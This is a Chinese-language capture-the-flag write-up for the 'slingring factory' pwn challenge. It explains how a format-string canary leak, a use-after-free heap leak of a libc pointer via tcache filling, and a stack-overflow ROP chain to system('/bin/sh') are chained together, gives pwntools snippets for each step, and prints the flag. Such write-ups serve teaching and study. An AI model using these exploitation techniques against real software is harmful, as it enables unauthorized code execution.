# slingring factory

## 题目简述

程序同时存在三类漏洞：用户名被直接作为 `printf` 格式字符串；释放 Sling Ring 后全局指针未清空，形成 UAF；`use_slingring()` 又把最多 0x100 字节读入 0x33 字节栈缓冲区。二进制开启全部常见保护，需要依次泄露 Canary、libc 地址，再执行 ret2libc。

## 解题过程

用户名最多 5 个有效字符，`%7$p` 足以从栈上打印 Canary：

```python
io.sendlineafter(b"name?", b"%7$p")
io.recvuntil(b"Hello, ")
canary = int(io.recvn(18), 16)
```

每个 `slingring_t` 含 0x80 字节目的地和 4 字节数量，malloc 后落入同一个 tcache 尺寸类。创建 9 个对象，释放前 8 个：前 7 个填满 tcache，第 8 个进入 unsorted bin；第 9 个仍在其上方，阻止空闲块与 top chunk 合并。

`discard_slingring()` 没有把 `rings[idx]` 设为 NULL，`show_slingrings()` 仍会用 `%s` 打印已释放对象的 `dest`。第 8 个块开头现已保存 unsorted-bin 的 `main_arena` 指针，读取 slot 7 的文本即可泄露它。题目 libc 中该指针偏移为 `0x21ace0`：

```python
libc.address = leak - 0x21ace0
```

最后进入 `use_slingring()`。从 `spell[0x33]` 到 Canary 的对齐后偏移为 `0x38`，载荷保留 Canary、覆盖旧 `rbp`，再调用 libc 的 `system("/bin/sh")`。额外加入一个 `ret` gadget 保持 x86-64 栈 16 字节对齐：

```python
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

payload = flat({
    0x38: p64(canary) + p64(0) + rop.chain(),
})
```

发送 spell 后取得：

```text
grey{y0u_4r3_50rc3r3r_supr3m3_m45t3r_0f_th3_myst1c_4rts_mBRt!y4vz5ea@uq}
```

## 方法总结

三个漏洞分别解决一个保护：短格式字符串泄露 Canary，UAF 配合 tcache 填充迫使块进入 unsorted bin 并泄露 libc，最终栈溢出完成 ret2libc。堆泄露能否成立取决于释放数量和相邻块状态；只复现“释放八次”而忽略第九个防合并块，通常得不到同样结果。
